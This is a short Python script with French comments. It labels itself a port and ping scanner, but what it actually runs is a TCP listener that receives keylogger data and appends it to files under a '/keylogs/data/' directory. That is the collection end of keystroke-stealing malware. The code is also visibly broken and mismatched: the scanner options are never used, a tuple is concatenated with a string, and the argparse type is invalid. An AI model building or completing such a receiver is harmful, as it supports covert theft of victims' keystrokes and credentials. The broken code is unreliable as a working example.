import argparse
import socket
import threading

from env import *
import datetime


def argument():
    p = argparse.ArgumentParser(description='NMAP MAIS EN MIEUX en faite.')
    p.add_argument('-p', '--ping', action='store_true', help='Fais un scan via Ping, pour voir les machines UP')
    p.add_argument('-s', '--socket', type=all,
                   help="Recherche si le port spécifié est UP, mettre autre chose qu'un INT pour faire sur les 100 premiers ports")
    p.add_argument('-o', action='store_true', help='Enregistre les resultats dans un fichier')
    args = p.parse_args()
    return args




server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind(("0.0.0.0", PORT))

server_socket.listen(5)


def receiver():
    print(f"Ecoute sur {SRV}:{PORT}")

    client_socket, client_address = server_socket.accept()
    print(f"connexion de {client_address}")

    ficname = client_address + str(datetime.date.today())
    # recu data
    with open("/keylogs/data/"+ficname, "a") as f:
        data = client_socket.recv(1024)
        f.write(data.decode('utf-8'))
        print("Data update vers -> :" + ficname)

    client_socket.close()
    server_socket.close()


receiver_t = threading.Thread(target=receiver)

receiver_t.start()

#commands_t = threading.Thread(target=commands)

#commands_t.start()